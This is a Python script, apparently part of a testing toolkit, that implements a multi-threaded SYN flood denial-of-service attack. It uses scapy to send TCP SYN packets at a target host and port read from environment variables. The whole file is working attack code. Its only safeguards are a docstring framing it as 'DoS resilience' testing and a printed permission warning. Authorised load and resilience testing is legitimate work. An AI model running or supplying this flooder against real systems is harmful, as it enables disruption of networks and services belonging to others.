#!/usr/bin/env python3
"""
SYN Flooder Module
Launch SYN flood attacks for testing DoS resilience
"""

import os
import sys
import random
import time
from threading import Thread, Lock
from queue import Queue

try:
    from scapy.all import IP, TCP, send
except ImportError:
    print("Error: scapy not installed")
    sys.exit(1)

packet_lock = Lock()
packets_sent = 0

def send_syn(target, port):
    """Send SYN packet"""
    global packets_sent
    try:
        src_port = random.randint(49152, 65535)
        packet = IP(dst=target)/TCP(sport=src_port, dport=port, flags="S")
        send(packet, verbose=False)
        
        with packet_lock:
            packets_sent += 1
        return True
    except:
        return False

def worker(target, port, queue):
    """Worker thread"""
    while True:
        task = queue.get()
        if task is None:
            break
        send_syn(target, port)
        queue.task_done()

def main():
    target = os.getenv('ARG_TARGET')
    port = int(os.getenv('ARG_PORT', '80'))
    count = int(os.getenv('ARG_COUNT', '1000'))
    num_threads = int(os.getenv('ARG_THREADS', '5'))
    
    if not target:
        print("Error: target required")
        sys.exit(1)
    
    print(f"[!] WARNING: This tool can cause serious network issues")
    print(f"[!] Only use on systems you own or have permission to test")
    print(f"\n[*] SYN Flooder for {target}:{port}")
    print(f"[*] Packets: {count}, Threads: {num_threads}")
    
    queue = Queue()
    threads = []
    
    start_time = time.time()
    
    # Start workers
    for i in range(num_threads):
        t = Thread(target=worker, args=(target, port, queue))
        t.start()
        threads.append(t)
    
    # Queue tasks
    print(f"\n[*] Queuing {count} SYN packets...")
    for i in range(count):
        queue.put(i)
        if (i + 1) % 100 == 0:
            print(f"[+] Queued {i + 1}/{count} packets", end='\r')
    
    print(f"\n[*] Sending SYN packets...")
    
    # Wait for completion
    queue.join()
    
    # Stop workers
    for i in range(num_threads):
        queue.put(None)
    for t in threads:
        t.join()
    
    elapsed = time.time() - start_time
    rate = packets_sent / elapsed if elapsed > 0 else 0
    
    print(f"\n[+] Complete!")
    print(f"[+] Sent {packets_sent} packets in {elapsed:.2f}s ({rate:.0f} pps)")

if __name__ == "__main__":
    main()
